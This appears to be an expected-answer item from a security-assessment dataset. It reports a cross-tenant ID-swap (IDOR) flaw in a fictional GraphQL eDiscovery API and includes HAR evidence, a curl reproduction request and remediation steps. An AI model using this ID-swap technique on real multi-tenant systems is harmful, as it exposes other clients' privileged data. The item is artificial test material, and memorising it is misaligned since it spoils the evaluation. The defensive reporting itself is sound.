# Expected Response

## System
- Domain: Legal Tech / eDiscovery
- System: LexVault eDiscovery API
- Example ID: GQL-0174

## Priority Findings

### Finding 1: eDiscovery — ID Swap Exposes Cross-Tenant Legal Documents (Pattern 10.1)
**Severity:** Critical
**Category:** Single-User / ID Swap in Own Request

**Summary:**
Per §5.0 (Pattern 10.1 — ID swap in own request): The `getResource` resolver accepts any `resourceId` without verifying ownership, enabling document ID swap attacks. An attacker from `tenant-e8ba` queried `getResource(id: "R-2174")` and received eDiscovery legal documents belonging to `tenant-f6ce`, including `CONFIDENTIAL-e8baf6ce`. In Legal Tech / eDiscovery, this exposes attorney-client privileged documents, evidence files, and legal hold materials.

**Evidence from HAR:**
- Request: `POST https://api.lexvault-ediscovery-.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-e8ba`
- Query: `getResource(id: "R-2174") { resourceId tenantId ownerId data { sensitiveField internalNotes } }`
- Response `200 OK`: `tenantId: "tenant-f6ce"`, `ownerId: "other-user-e8baf6ce"`, `sensitiveField: "CONFIDENTIAL-e8baf6ce"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-e8baf6ce`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §5.0 | Pattern 10.1 | ID swap, no ownership verification |
| HAR request | x-tenant-id | Attacker tenant-e8ba |
| HAR response | tenantId | Cross-tenant legal docs tenant-f6ce |
| HAR response | sensitiveField | CONFIDENTIAL-e8baf6ce |

## Steps to Reproduce

### Step 1 — getResource legal doc ID swap (HAR)
```bash
curl -s -X POST https://api.lexvault-ediscovery-.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-e8ba" \
  -d '{"query": "query { getResource(id: \"R-2174\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** `tenant-f6ce` legal documents returned. **Secure:** FORBIDDEN.

## Remediation
1. Resolver: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
2. Attorney-client privilege: additional role-based access for privileged documents.
3. Redis cache key: `resource:{tenantId}:{resourceId}`.
